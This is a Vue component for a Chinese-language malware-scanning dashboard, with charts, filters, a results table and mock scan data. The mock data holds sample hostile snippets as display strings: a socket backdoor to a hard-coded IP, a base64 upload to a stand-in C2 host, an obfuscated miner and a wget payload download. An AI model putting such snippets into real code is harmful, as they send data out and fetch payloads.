<template>
  <div class="scan-details-page">
    <!-- Tab 切换 -->
    <div class="scan-tabs" role="tablist">
      <button
        type="button"
        class="scan-tab"
        :class="{ 'scan-tab--active': activeTab === 'sca' }"
        @click="activeTab = 'sca'"
      >SCA 扫描</button>
      <button
        type="button"
        class="scan-tab"
        :class="{ 'scan-tab--active': activeTab === 'malware' }"
        @click="activeTab = 'malware'"
      >恶意代码扫描</button>
    </div>

    <!-- SCA 扫描 - iframe -->
    <div v-if="activeTab === 'sca'" class="sca-frame-wrap">
      <iframe
        src="http://10.205.128.65:81/#/home"
        class="sca-frame"
        frameborder="0"
        allowfullscreen
      ></iframe>
    </div>

    <!-- 恶意代码扫描 -->
    <template v-if="activeTab === 'malware'">
      <!-- KPI 统计卡片 -->
    <section class="kpi-row" aria-label="扫描统计概览">
      <div class="kpi-card">
        <div class="kpi-card-icon kpi-card-icon--total">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.3-4.3"/></svg>
        </div>
        <div class="kpi-card-body">
          <div class="kpi-card-value">{{ stats.totalScans }}</div>
          <div class="kpi-card-label">累计扫描次数</div>
        </div>
      </div>
      <div class="kpi-card">
        <div class="kpi-card-icon kpi-card-icon--malicious">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
        </div>
        <div class="kpi-card-body">
          <div class="kpi-card-value kpi-card-value--danger">{{ stats.maliciousCount }}</div>
          <div class="kpi-card-label">恶意代码检出</div>
        </div>
      </div>
      <div class="kpi-card">
        <div class="kpi-card-icon kpi-card-icon--suspicious">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
        </div>
        <div class="kpi-card-body">
          <div class="kpi-card-value kpi-card-value--warning">{{ (stats.maliciousCount / Math.max(stats.totalScans,1) * 100).toFixed(1) }}%</div>
          <div class="kpi-card-label">检出率</div>
        </div>
      </div>
      <div class="kpi-card">
        <div class="kpi-card-icon kpi-card-icon--safe">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>
        </div>
        <div class="kpi-card-body">
          <div class="kpi-card-value kpi-card-value--safe">{{ stats.thisWeekNew }}</div>
          <div class="kpi-card-label">本周新发现恶意代码</div>
        </div>
      </div>
    </section>

    <!-- 恶意类型分析 -->
    <section class="mal-type-section">
      <div class="mal-type-left">
        <h3 class="mal-type-title">恶意类型分布</h3>
        <div class="donut-wrap">
          <svg class="donut-svg" viewBox="0 0 120 120">
            <circle cx="60" cy="60" r="48" fill="none" stroke="#f3f4f6" stroke-width="18" />
            <circle v-for="(item, i) in typeRingData" :key="item.type"
              cx="60" cy="60" r="48" fill="none"
              :stroke="item.color" stroke-width="18"
              :stroke-dasharray="item.dashArray"
              :stroke-dashoffset="item.dashOffset"
              transform="rotate(-90 60 60)"
              class="donut-segment"
            />
            <text x="60" y="56" text-anchor="middle" class="donut-center-val">{{ stats.maliciousCount }}</text>
            <text x="60" y="73" text-anchor="middle" class="donut-center-label">检出</text>
          </svg>
          <div class="donut-legend">
            <div v-for="item in typeRingData" :key="item.type" class="donut-legend-item">
              <span class="donut-dot" :style="{ background: item.color }"></span>
              <span class="donut-legend-label">{{ item.label }}</span>
              <span class="donut-legend-pct">{{ item.percent }}%</span>
            </div>
          </div>
        </div>
      </div>
      <div class="mal-type-right">
        <h3 class="mal-type-title">检出最多的恶意类型 Top 5</h3>
        <div class="hbar-list">
          <div v-for="item in top5Data" :key="item.type" class="hbar-item">
            <div class="hbar-row">
              <span class="hbar-label">{{ item.label }}</span>
              <span class="hbar-count">{{ item.count }}次</span>
            </div>
            <div class="hbar-track">
              <div class="hbar-fill" :style="{ width: item.barPercent, background: item.color }"></div>
            </div>
          </div>
        </div>
      </div>
    </section>

    <!-- 风险分布条 -->
    <section class="risk-bar-section">
      <div class="risk-bar-header">
        <span class="risk-bar-title">风险等级分布</span>
        <span class="risk-bar-total">共 {{ stats.totalScans }} 次扫描</span>
      </div>
      <div class="risk-bar-track">
        <div
          class="risk-bar-segment risk-bar-segment--critical"
          :style="{ width: riskPercent('critical') }"
          :title="'严重: ' + stats.criticalCount"
        >
          <span v-if="stats.criticalCount > 0" class="risk-bar-label">严重 {{ stats.criticalCount }}</span>
        </div>
        <div
          class="risk-bar-segment risk-bar-segment--high"
          :style="{ width: riskPercent('high') }"
          :title="'高危: ' + stats.highCount"
        >
          <span v-if="stats.highCount > 0" class="risk-bar-label">高危 {{ stats.highCount }}</span>
        </div>
        <div
          class="risk-bar-segment risk-bar-segment--medium"
          :style="{ width: riskPercent('medium') }"
          :title="'中危: ' + stats.mediumCount"
        >
          <span v-if="stats.mediumCount > 0" class="risk-bar-label">中危 {{ stats.mediumCount }}</span>
        </div>
        <div
          class="risk-bar-segment risk-bar-segment--low"
          :style="{ width: riskPercent('low') }"
          :title="'低危: ' + stats.lowCount"
        >
          <span v-if="stats.lowCount > 0" class="risk-bar-label">低危 {{ stats.lowCount }}</span>
        </div>
      </div>
      <div class="risk-bar-legend">
        <span class="legend-item"><i class="legend-dot legend-dot--critical"></i>严重</span>
        <span class="legend-item"><i class="legend-dot legend-dot--high"></i>高危</span>
        <span class="legend-item"><i class="legend-dot legend-dot--medium"></i>中危</span>
        <span class="legend-item"><i class="legend-dot legend-dot--low"></i>低危</span>
      </div>
    </section>

    <!-- 筛选栏 -->
    <section class="filter-bar">
      <div class="filter-left">
        <select v-model="filterRisk" class="filter-select" aria-label="风险等级筛选">
          <option value="">全部风险等级</option>
          <option value="critical">严重</option>
          <option value="high">高危</option>
          <option value="medium">中危</option>
          <option value="low">低危</option>
          <option value="none">安全</option>
        </select>
        <select v-model="filterType" class="filter-select" aria-label="恶意类型筛选">
          <option value="">全部恶意类型</option>
          <option value="backdoor">后门代码</option>
          <option value="trojan">木马程序</option>
          <option value="miner">挖矿脚本</option>
          <option value="ransomware">勒索软件</option>
          <option value="info-stealer">信息窃取</option>
          <option value="webshell">WebShell</option>
          <option value="obfuscated">混淆恶意代码</option>
          <option value="other">其他</option>
        </select>
        <select v-model="filterStatus" class="filter-select" aria-label="处理状态筛选">
          <option value="">全部状态</option>
          <option value="pending">待处理</option>
          <option value="processing">处理中</option>
          <option value="resolved">已处理</option>
          <option value="ignored">已忽略</option>
        </select>
      </div>
      <div class="filter-right">
        <div class="filter-search">
          <svg class="filter-search-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.3-4.3"/></svg>
          <input
            v-model="filterKeyword"
            type="search"
            class="filter-search-input"
            placeholder="搜索软件名称或文件路径..."
            @input="page = 1"
          />
        </div>
      </div>
    </section>

    <!-- 扫描记录表格 -->
    <section class="manage-card" aria-labelledby="scan-details-title">
      <h2 id="scan-details-title" class="manage-card-title">恶意代码</h2>

      <div class="manage-table-wrap">
        <table class="manage-table">
          <thead>
            <tr>
              <th>序号</th>
              <th>软件名称</th>
              <th>软件版本</th>
              <th>文件名称</th>
              <th>恶意类别</th>
              <th>恶意类型</th>
              <th>恶意类型小类</th>
              <th>威胁等级</th>
              <th>置信度</th>
              <th>检测结果</th>
            </tr>
          </thead>
          <tbody>
            <tr v-if="paginatedList.length === 0" class="manage-empty-row">
              <td colspan="10">
                <div class="manage-empty">
                  <div class="manage-empty-art" aria-hidden="true">
                    <svg viewBox="0 0 120 100" fill="none" xmlns="http://www.w3.org/2000/svg">
                      <path fill="#f3f4f6" stroke="#e5e7eb" stroke-width="1.2" d="M24 28h72v52H24z"/>
                      <circle cx="60" cy="48" r="10" fill="#fff" stroke="#e5e7eb"/>
                      <path d="M56 44l8 8M64 44l-8 8" stroke="#e5e7eb" stroke-width="1.2"/>
                    </svg>
                  </div>
                  <p class="manage-empty-text">暂无匹配的扫描记录</p>
                </div>
              </td>
            </tr>
            <tr v-for="(row, i) in paginatedList" :key="row.id" @click="openDetail(row)" style="cursor:pointer">
              <td>{{ (page - 1) * pageSize + i + 1 }}</td>
              <td class="name-cell">{{ row.softwareName }}</td>
              <td>{{ row.version }}</td>
              <td><span class="file-cell file-cell--link" :title="row.filePath" @click.stop="openDetail(row)">{{ row.fileName || row.softwareName }}</span></td>
              <td><span class="mal-cat-tag">{{ row.malwareCategory }}</span></td>
              <td><span class="mal-type-tag">{{ row.malwareType }}</span></td>
              <td><span class="type-tag">{{ row.maliciousTypeLabel }}</span></td>
              <td>
                <span class="risk-badge" :class="'risk-badge--' + row.riskLevel">
                  {{ riskLabel[row.riskLevel] }}
                </span>
              </td>
              <td><span class="conf-tag" :class="'conf-tag--' + row.confidence">{{ row.confidenceLabel }}</span></td>
              <td class="detect-cell" :title="row.detectResult">{{ row.detectResult }}</td>
            </tr>
          </tbody>
        </table>
      </div>

      <footer class="manage-footer">
        <span class="manage-total">共计 {{ filteredList.length }} 条</span>
        <div class="manage-pager">
          <button type="button" class="manage-page-btn" :disabled="page <= 1" @click="page = Math.max(1, page - 1)">‹</button>
          <span class="manage-page-current">{{ page }}</span>
          <button type="button" class="manage-page-btn" :disabled="page >= totalPages" @click="page = Math.min(totalPages, page + 1)">›</button>
          <label class="manage-page-size">
            <select v-model.number="pageSize" class="manage-page-select">
              <option :value="10">10 / 页</option>
              <option :value="20">20 / 页</option>
              <option :value="50">50 / 页</option>
            </select>
          </label>
        </div>
      </footer>
    </section>

    <!-- 右侧详情侧边栏 -->
    <Teleport to="body">
      <div v-if="detailVisible" class="drawer-overlay" @click.self="detailVisible = false">
        <div class="drawer" :class="{ 'drawer--open': detailVisible }">
          <div class="drawer-header">
            <h3>恶意代码详情</h3>
            <button type="button" class="drawer-close" @click="detailVisible = false">✕</button>
          </div>
          <div class="drawer-body" v-if="detailRow">
            <!-- 基本信息 -->
            <section class="drawer-section">
              <h4 class="drawer-section-title">基本信息</h4>
              <div class="drawer-info-grid">
                <div class="drawer-info-row"><span class="drawer-info-label">文件名称</span><span class="drawer-info-value">{{ detailRow.fileName }}</span></div>
                <div class="drawer-info-row"><span class="drawer-info-label">文件位置</span><span class="drawer-info-value">{{ detailRow.filePath }}</span></div>
              </div>
            </section>

            <!-- 检测结果 -->
            <section class="drawer-section">
              <h4 class="drawer-section-title">威胁内容</h4>
              <div class="drawer-detect-box">{{ detailRow.detectResult }}</div>
            </section>

            <!-- 命中规则 -->
            <section class="drawer-section">
              <h4 class="drawer-section-title">关键日志</h4>
              <div v-for="rule in detailRow.matchedRules" :key="rule.name" class="drawer-rule">
                <div class="drawer-rule-header">
                  <span class="drawer-rule-name">{{ rule.name }}</span>
                </div>
                <div class="drawer-rule-lines">
                  <div v-for="line in rule.lines" :key="line" class="drawer-rule-line">{{ line }}</div>
                </div>
              </div>
            </section>
          </div>
        </div>
      </div>
    </Teleport>

    <!-- Toast 提示 -->
    <Teleport to="body">
      <div v-if="toastVisible" class="toast-notification">
        <svg viewBox="0 0 20 20" fill="currentColor" class="toast-icon">
          <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.857-9.809a.75.75 0 00-1.214-.882l-3.483 4.79-1.88-1.88a.75.75 0 10-1.06 1.061l2.5 2.5a.75.75 0 001.137-.089l4-5.5z" clip-rule="evenodd"/>
        </svg>
        <span>{{ toastMessage }}</span>
      </div>
    </Teleport>
  </template>
  </div>
</template>

<script setup>
import { ref, reactive, computed, watch } from 'vue'

// ===== Tab 切换 =====
const activeTab = ref('malware')

// ===== 筛选状态 =====
const filterRisk = ref('')
const filterType = ref('')
const filterStatus = ref('')
const filterKeyword = ref('')

// ===== 分页 =====
const page = ref(1)
const pageSize = ref(10)

watch([filterRisk, filterType, filterStatus], () => { page.value = 1 })
watch(pageSize, () => { page.value = 1 })

// ===== 详情弹窗 =====
const detailVisible = ref(false)
const detailRow = ref(null)

const openRules = reactive({})

function openDetail(row) {
  detailRow.value = row
  detailVisible.value = true
}

// ===== Toast =====
const toastVisible = ref(false)
const toastMessage = ref('')
let toastTimer = null

function showToast(msg) {
  toastMessage.value = msg
  toastVisible.value = true
  clearTimeout(toastTimer)
  toastTimer = setTimeout(() => { toastVisible.value = false }, 2500)
}

// ===== 标签映射 =====
const riskLabel = {
  critical: '严重',
  high: '高危',
  medium: '中危',
  low: '低危',
  none: '安全',
}

const statusLabel = {
  pending: '待处理',
  processing: '处理中',
  resolved: '已处理',
  ignored: '已忽略',
}

const maliciousTypeLabelMap = {
  backdoor: '后门代码',
  trojan: '木马程序',
  miner: '挖矿脚本',
  ransomware: '勒索软件',
  'info-stealer': '信息窃取',
  webshell: 'WebShell',
  obfuscated: '混淆恶意代码',
  other: '其他',
}

// ===== 处理操作 =====
function handleProcess(row, newStatus) {
  row.status = newStatus
  const labels = { processing: '开始处理', resolved: '标记已处理' }
  showToast(`${row.softwareName} ${labels[newStatus]}成功`)
}

// ===== 统计数据 =====
const stats = computed(() => {
  const list = scanRecords.value
  const now = new Date()
  const weekAgo = new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000)
  return {
    totalScans: list.length,
    maliciousCount: list.filter(r => r.riskLevel !== 'none').length,
    suspiciousCount: list.filter(r => r.riskLevel === 'medium' || r.riskLevel === 'low').length,
    safeCount: list.filter(r => r.riskLevel === 'none').length,
    criticalCount: list.filter(r => r.riskLevel === 'critical').length,
    highCount: list.filter(r => r.riskLevel === 'high').length,
    mediumCount: list.filter(r => r.riskLevel === 'medium').length,
    lowCount: list.filter(r => r.riskLevel === 'low').length,
    thisWeekNew: list.filter(r => {
      const t = new Date(r.scanTime)
      return t >= weekAgo && r.riskLevel !== 'none'
    }).length,
  }
})

function riskPercent(key) {
  const total = stats.value.totalScans - stats.value.safeCount
  if (total === 0) return '0%'
  const map = {
    critical: stats.value.criticalCount,
    high: stats.value.highCount,
    medium: stats.value.mediumCount,
    low: stats.value.lowCount,
  }
  return (map[key] / total * 100).toFixed(2) + '%'
}

// ===== 恶意类型图表 =====
const typeColors = {
  trojan: '#ef4444', miner: '#f59e0b', webshell: '#8b5cf6', backdoor: '#3b82f6',
  ransomware: '#ec4899', 'info-stealer': '#14b8a6', obfuscated: '#f97316', other: '#9ca3af',
}
const typeLabels = {
  backdoor: '后门', trojan: '木马下载执行', miner: '挖矿脚本',
  ransomware: '勒索软件', 'info-stealer': '信息窃取', webshell: 'WebShell',
  obfuscated: '混淆恶意代码', other: '其他',
}

const typeRingData = computed(() => {
  const list = scanRecords.value.filter(r => r.riskLevel !== 'none')
  const total = list.length || 1
  const map = {}
  list.forEach(r => { const t = r.maliciousType || 'other'; map[t] = (map[t] || 0) + 1 })
  const entries = Object.entries(map).sort((a, b) => b[1] - a[1])

  let items = entries
  if (entries.length > 5) {
    // 把 "other" 和其他超出项合并
    let otherSum = 0
    const top = []
    entries.forEach(([type, count]) => {
      if (top.length < 4 && type !== 'other') {
        top.push([type, count])
      } else {
        otherSum += count
      }
    })
    items = [...top, ['other', otherSum]]
  }

  const circumference = 2 * Math.PI * 48 // r=48
  let offset = 0
  const result = items.map(([type, count], i) => {
    const pct = (count / total * 100)
    const p = Math.round(pct * 10) / 10
    const dashLen = (pct / 100) * circumference
    const dashArray = i === items.length - 1
      ? circumference - offset + ' ' + circumference
      : dashLen + ' ' + (circumference - dashLen)
    const r = {
      type,
      label: typeLabels[type] || type,
      count,
      percent: p,
      color: typeColors[type] || '#9ca3af',
      dashArray: dashLen + ' ' + (circumference - dashLen),
      dashOffset: -offset,
    }
    offset += dashLen
    return r
  })
  return result
})

const top5Data = computed(() => {
  const list = scanRecords.value.filter(r => r.riskLevel !== 'none')
  const map = {}
  list.forEach(r => { const t = r.maliciousType || 'other'; map[t] = (map[t] || 0) + 1 })
  const entries = Object.entries(map).sort((a, b) => b[1] - a[1]).slice(0, 5)
  const maxCount = entries.length > 0 ? entries[0][1] : 1
  return entries.map(([type, count]) => ({
    type,
    label: typeLabels[type] || type,
    count,
    barPercent: (count / maxCount * 100).toFixed(0) + '%',
    color: typeColors[type] || '#9ca3af',
  }))
})

// ===== 筛选 =====
const filteredList = computed(() => {
  let list = scanRecords.value
  if (filterRisk.value) list = list.filter(r => r.riskLevel === filterRisk.value)
  if (filterType.value) list = list.filter(r => r.maliciousType === filterType.value)
  if (filterStatus.value) list = list.filter(r => r.status === filterStatus.value)
  if (filterKeyword.value) {
    const kw = filterKeyword.value.toLowerCase()
    list = list.filter(r =>
      r.softwareName.toLowerCase().includes(kw) ||
      r.filePath.toLowerCase().includes(kw)
    )
  }
  return list
})

const paginatedList = computed(() => {
  const start = (page.value - 1) * pageSize.value
  return filteredList.value.slice(start, start + pageSize.value)
})

const totalPages = computed(() => Math.max(1, Math.ceil(filteredList.value.length / pageSize.value)))

// ===== 模拟数据 =====
const maliciousTypes = ['backdoor', 'trojan', 'miner', 'ransomware', 'info-stealer', 'webshell', 'obfuscated', 'other']
const riskLevels = ['critical', 'high', 'medium', 'low', 'none']
const statuses = ['pending', 'processing', 'resolved', 'ignored']
const softwareNames = [
  'Spring Boot', 'React', 'Vue.js', 'TensorFlow', 'FastAPI', 'Flask',
  'Django', 'Express', 'Lodash', 'Axios', 'jQuery', 'Nginx',
  'Redis', 'PostgreSQL', 'MySQL', 'MongoDB', 'Kafka', 'Elasticsearch',
  'Kubernetes', 'Docker', 'Node.js', 'Go', 'Rust', 'Python',
]
const engines = ['ClamAV', 'YARA规则引擎', 'AI检测模型', '特征码匹配', '行为分析引擎']
const fileNames = [
  'utils/helper.js', 'lib/network.py', 'src/main/App.java', 'pkg/install.sh',
  'vendor/third-party.so', 'scripts/deploy.ps1', 'modules/encrypt.go', 'config/init.rb',
  'bin/startup.dll', 'include/crypto.h', 'services/auth.ts', 'plugins/backup.php',
  'dist/bundle.min.js', 'core/engine.cpp', 'tools/scanner.rs',
]
const iocPools = {
  ip: ['185.220.101.34', '91.121.87.40', '45.155.205.233', '103.224.182.210'],
  domain: ['evil-c2.example.com', 'malware-drop.net', 'phish-kit.cc', 'crypto-miner.pw'],
  hash: ['a3f5b8c1d2e4...', '7b9c3f1a8e2d...', 'f2e8a1c3d5b7...'],
}

const codeSnippets = [
  '// 疑似后门代码\nfunction executeRemote(cmd) {\n  const socket = new net.Socket();\n  socket.connect(4444, "185.220.101.34");\n  socket.write(obfuscate(cmd));\n  return socket.read();\n}',
  '# 可疑网络连接\ndef send_data(payload):\n    import base64\n    encoded = base64.b64encode(payload)\n    requests.post("http://evil-c2.example.com/up", data=encoded)\n    return True',
  '// 混淆挖矿代码\n(function(){\n  var _0x4d2f=["\x63\x72\x79\x70\x74\x6f","\x6d\x69\x6e\x65"];\n  new Worker(URL.createObjectURL(new Blob([atob(_0x4d2f[0])])));\n})();',
  'package main\n\nimport "os/exec"\n\nfunc runHidden(cmd string) {\n  c := exec.Command("bash", "-c", cmd)\n  c.Start()\n  c.Wait()\n}',
  'class EvilPayload {\n  public static void main(String[] args) {\n    Runtime rt = Runtime.getRuntime();\n    Process p = rt.exec("wget -q http://malware-drop.net/payload");\n  }\n}',
]

const suggestions = [
  '建议立即隔离该文件，删除相关代码并从可信源重新获取该依赖版本。同时排查服务器是否已被入侵，检查异常进程和网络连接。',
  '该代码包含可疑的网络外连行为，建议阻断相关网络请求，审查该组件的供应链来源，确认是否为官方发布版本。',
  '检测到混淆代码片段，可能是隐藏的恶意逻辑。建议使用反混淆工具还原代码，对比官方源码确认是否被篡改。',
  '发现潜在的权限提升代码，建议限制该组件的运行权限，使用沙箱环境隔离执行，并上报安全团队进行深度分析。',
  '该文件包含已知恶意特征签名，确认为恶意代码。建议立即删除、回滚到安全版本，并对受影响系统进行全面安全扫描。',
]

function randomPick(arr) { return arr[Math.floor(Math.random() * arr.length)] }

function generateIOCs(riskLevel) {
  if (riskLevel === 'none') return []
  const count = riskLevel === 'critical' ? 3 : riskLevel === 'high' ? 2 : 1
  const pool = [
    ...iocPools.ip.map(v => ({ type: 'IP', value: v })),
    ...iocPools.domain.map(v => ({ type: '域名', value: v })),
    ...iocPools.hash.map(v => ({ type: 'Hash', value: v })),
  ]
  return pool.slice(0, count)
}

const scanRecords = ref(
  Array.from({ length: 86 }, (_, i) => {
    const riskLevel = i < 6 ? 'critical' : i < 18 ? 'high' : i < 40 ? 'medium' : i < 65 ? 'low' : 'none'
    const malType = riskLevel === 'none' ? 'other' : randomPick(maliciousTypes)
    const date = new Date(2026, 5, 1)
    date.setHours(date.getHours() - i * 5)
    const malTypeLabel = maliciousTypeLabelMap[malType] || '其他'
    const rules = [
      { name: 'Rule_D_HTTP_HttpURLConnection', lines: [
        'Line[27]:  import java.net.URLConnection;',
        'Line[150]: this.addURL(new URL(address.trim()));',
        'Line[381]: readStream(pingProcess.getInputStream(), false);',
        'Line[401]: while((inputLine = reader.readLine()) != null) {',
        'Line[418]: URLConnection connection = url.openConnection();',
        'Line[420]: InputStream is = connection.getInputStream();',
        'Line[112]: FileOutputStream fos = new FileOutputStream(file);',
        'Line[118]: fos.write(data);',
      ]}
    ]
    return {
      id: i + 1,
      softwareName: randomPick(softwareNames),
      version: `${Math.floor(Math.random() * 5) + 1}.${Math.floor(Math.random() * 30)}.${Math.floor(Math.random() * 20)}`,
      scanTime: date.toLocaleString('zh-CN'),
      riskLevel,
      maliciousType: malType,
      maliciousTypeLabel: malTypeLabel,
      filePath: `/src/${randomPick(fileNames)}`,
      fileName: randomPick(fileNames),
      status: randomPick(statuses),
      engine: randomPick(engines),
      malwareCategory: randomPick(['Java', 'C++', 'Python', 'JavaScript', 'Go', 'C', 'TypeScript', 'Ruby']),
      malwareType: '恶意行为',
      confidence: randomPick(['high', 'medium', 'low']),
      confidenceLabel: ({ high: '高', medium: '中', low: '低' })[randomPick(['high', 'medium', 'low'])],
      detectResult: `疑似存在${malTypeLabel}, 包含: 文件 ${randomPick(['/lib/core.so', '/src/main.js', '/bin/run.sh', '/app/index.php', '/etc/config.yml'])}`,
      description: `检测到${maliciousTypeLabelMap[malType] || '未知'}代码特征，位于文件 ${randomPick(fileNames)}，威胁评分 ${riskLevel === 'critical' ? '95' : riskLevel === 'high' ? '82' : riskLevel === 'medium' ? '60' : '35'}。`,
      matchedRules: rules.slice(0, Math.floor(Math.random() * 3) + 1),
      codeSnippet: randomPick(codeSnippets),
      iocs: generateIOCs(riskLevel),
      suggestion: randomPick(suggestions),
    }
  })
)
</script>

<style scoped>
.scan-details-page {
  min-height: 100%;
  margin: 0 auto;
}

/* ===== Tab ===== */
.scan-tabs {
  display: flex;
  gap: 4px;
  margin-bottom: 20px;
  background: #f3f4f6;
  border-radius: 8px;
  padding: 3px;
  width: fit-content;
}
.scan-tab {
  padding: 7px 20px;
  border: none;
  border-radius: 6px;
  background: transparent;
  font-size: 13px;
  font-weight: 500;
  color: #6b7280;
  cursor: pointer;
  transition: all 0.15s;
}
.scan-tab:hover { color: #374151; }
.scan-tab--active {
  background: #fff;
  color: #111827;
  box-shadow: 0 1px 3px rgba(0,0,0,0.08);
}

/* ===== SCA iframe ===== */
.sca-frame-wrap {
  background: #fff;
  border: 1px solid #e5e7eb;
  border-radius: 10px;
  overflow: hidden;
  height: calc(100vh - 180px);
  min-height: 500px;
}
.sca-frame {
  width: 100%;
  height: 100%;
  border: none;
}

/* ===== KPI 卡片 ===== */
.kpi-row {
  display: grid;
  grid-template-columns: repeat(4, 1fr);
  gap: 16px;
  margin-bottom: 20px;
}

.kpi-card {
  background: #fff;
  border-radius: 10px;
  padding: 20px 24px;
  display: flex;
  align-items: center;
  gap: 16px;
  box-shadow: 0 1px 3px rgba(0, 0, 0, 0.08);
  border: 1px solid #f0f0f0;
  transition: box-shadow 0.2s;
}

.kpi-card:hover {
  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
}

/* 恶意类型分析 */
.mal-type-section {
  display: flex;
  gap: 24px;
  margin-bottom: 24px;
}
.mal-type-left,
.mal-type-right {
  flex: 1;
  background: #fff;
  border: 1px solid #e5e7eb;
  border-radius: 10px;
  padding: 20px;
}
.mal-type-title {
  font-size: 14px;
  font-weight: 600;
  color: #1f2937;
  margin-bottom: 16px;
}
.donut-wrap {
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 44px;
}
.donut-svg {
  width: 170px;
  height: 170px;
  flex-shrink: 0;
}
.donut-segment {
  transition: stroke-dasharray 0.4s ease;
}
.donut-center-val {
  font-size: 24px;
  font-weight: 700;
  fill: #1f2937;
}
.donut-center-label {
  font-size: 12px;
  fill: #9ca3af;
}
.donut-legend {
  display: flex;
  flex-direction: column;
  gap: 6px;
}
.donut-legend-item {
  display: flex;
  align-items: center;
  gap: 7px;
  font-size: 13px;
}
.donut-dot {
  width: 8px;
  height: 8px;
  border-radius: 50%;
  flex-shrink: 0;
}
.donut-legend-label {
  color: #374151;
  min-width: 70px;
}
.donut-legend-pct {
  color: #9ca3af;
  font-weight: 500;
}
.hbar-list {
  display: flex;
  flex-direction: column;
  gap: 14px;
}
.hbar-item {
  display: flex;
  flex-direction: column;
  gap: 4px;
}
.hbar-row {
  display: flex;
  justify-content: space-between;
  align-items: center;
}
.hbar-label {
  font-size: 13px;
  color: #374151;
  font-weight: 500;
}
.hbar-count {
  font-size: 12px;
  color: #9ca3af;
}
.hbar-track {
  height: 8px;
  background: #f3f4f6;
  border-radius: 4px;
  overflow: hidden;
}
.hbar-fill {
  height: 100%;
  border-radius: 4px;
  transition: width 0.5s ease;
  min-width: 2px;
}

/* 风险分布条 */
.kpi-card-icon {
  width: 48px;
  height: 48px;
  border-radius: 12px;
  display: flex;
  align-items: center;
  justify-content: center;
  flex-shrink: 0;
}

.kpi-card-icon svg {
  width: 24px;
  height: 24px;
}

.kpi-card-icon--total {
  background: #eff6ff;
  color: #3b82f6;
}

.kpi-card-icon--malicious {
  background: #fef2f2;
  color: #dc2626;
}

.kpi-card-icon--suspicious {
  background: #fffbeb;
  color: #f59e0b;
}

.kpi-card-icon--safe {
  background: #f0fdf4;
  color: #16a34a;
}

.kpi-card-body {
  display: flex;
  flex-direction: column;
  gap: 4px;
}

.kpi-card-value {
  font-size: 28px;
  font-weight: 700;
  color: #111827;
  line-height: 1.2;
}

.kpi-card-value--danger { color: #dc2626; }
.kpi-card-value--warning { color: #d97706; }
.kpi-card-value--safe { color: #16a34a; }

.kpi-card-label {
  font-size: 13px;
  color: #6b7280;
}

/* ===== 风险分布条 ===== */
.risk-bar-section {
  background: #fff;
  border-radius: 10px;
  padding: 20px 24px;
  margin-bottom: 20px;
  box-shadow: 0 1px 3px rgba(0, 0, 0, 0.08);
  border: 1px solid #f0f0f0;
}

.risk-bar-header {
  display: flex;
  align-items: center;
  justify-content: space-between;
  margin-bottom: 14px;
}

.risk-bar-title {
  font-size: 14px;
  font-weight: 600;
  color: #111827;
}

.risk-bar-total {
  font-size: 12px;
  color: #9ca3af;
}

.risk-bar-track {
  display: flex;
  height: 28px;
  border-radius: 14px;
  overflow: hidden;
  background: #f3f4f6;
}

.risk-bar-segment {
  display: flex;
  align-items: center;
  justify-content: center;
  min-width: 0;
  transition: width 0.3s ease;
  overflow: hidden;
}

.risk-bar-segment:first-child { border-radius: 14px 0 0 14px; }
.risk-bar-segment:last-child { border-radius: 0 14px 14px 0; }

.risk-bar-segment--critical { background: #7f1d1d; }
.risk-bar-segment--high { background: #dc2626; }
.risk-bar-segment--medium { background: #f59e0b; }
.risk-bar-segment--low { background: #fbbf24; }
.risk-bar-segment--safe { background: #d1fae5; }

.risk-bar-label {
  font-size: 11px;
  font-weight: 600;
  color: #fff;
  white-space: nowrap;
  text-shadow: 0 1px 2px rgba(0,0,0,0.3);
}

.risk-bar-legend {
  display: flex;
  gap: 20px;
  margin-top: 12px;
  flex-wrap: wrap;
}

.legend-item {
  display: flex;
  align-items: center;
  gap: 6px;
  font-size: 12px;
  color: #6b7280;
}

.legend-dot {
  width: 10px;
  height: 10px;
  border-radius: 50%;
  display: inline-block;
}

.legend-dot--critical { background: #7f1d1d; }
.legend-dot--high { background: #dc2626; }
.legend-dot--medium { background: #f59e0b; }
.legend-dot--low { background: #fbbf24; }
.legend-dot--safe { background: #d1fae5; }

/* ===== 筛选栏 ===== */
.filter-bar {
  display: flex;
  align-items: center;
  justify-content: space-between;
  gap: 16px;
  margin-bottom: 20px;
  flex-wrap: wrap;
}

.filter-left {
  display: flex;
  gap: 10px;
  flex-wrap: wrap;
}

.filter-right {
  display: flex;
  gap: 10px;
}

.filter-select {
  height: 36px;
  padding: 0 32px 0 12px;
  border: 1px solid #e5e7eb;
  border-radius: 8px;
  font-size: 13px;
  color: #374151;
  background: #fff;
  cursor: pointer;
  appearance: none;
  background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='10' height='10' viewBox='0 0 10 10'%3E%3Cpath fill='%236b7280' d='M2 3l3 4 3-4'/%3E%3C/svg%3E");
  background-repeat: no-repeat;
  background-position: right 10px center;
}

.filter-select:focus {
  outline: none;
  border-color: #da203e;
  box-shadow: 0 0 0 3px rgba(218, 32, 62, 0.1);
}

.filter-search {
  position: relative;
}

.filter-search-icon {
  position: absolute;
  left: 10px;
